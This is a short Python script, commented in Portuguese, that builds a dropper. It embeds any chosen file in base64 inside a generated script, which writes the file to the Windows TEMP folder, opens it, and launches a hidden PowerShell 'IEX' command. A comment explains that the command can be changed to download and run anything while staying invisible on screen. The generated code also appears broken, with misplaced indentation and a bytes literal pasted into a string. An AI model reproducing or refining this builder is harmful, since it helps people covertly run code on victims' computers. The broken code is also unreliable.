import os, base64
archive =  input("Caminho do arquivo(com extensão): ")
archive_name = os.path.basename(archive)

with open (archive, 'rb') as open_archive:
    with open('arquivo_final.py', 'w') as arquivo_criado:
        arquivo_criado.write(f'''import os, base64
        def join(binaries, archive_name):
            if not os.path.exists(os.environ["TEMP"]+"\\\\"+archive_name):
                with open(os.environ["TEMP"]+"\\\\"+archive_name,"wb") as temp_archive:
                    temp_archive.write(binaries)
            os.startfile(os.environ["TEMP"]+"\\\\"+archive_name)
            cmd = "powershell.exe -nop -w hidden -c IEX (ipconfig)"#você pode solicitar o download a algum arquivo na internet, execução de algum .exe ou qualquer outra coisa via powershell,o hidden significa que não será exibido nada na tela, tudo invisível
            os.popen(cmd)
        archive_base64 = "%s"
        join(base64.b64decode(archive_base64), "%s")
            '''%(base64.b64encode(open_archive.read()),archive_name))

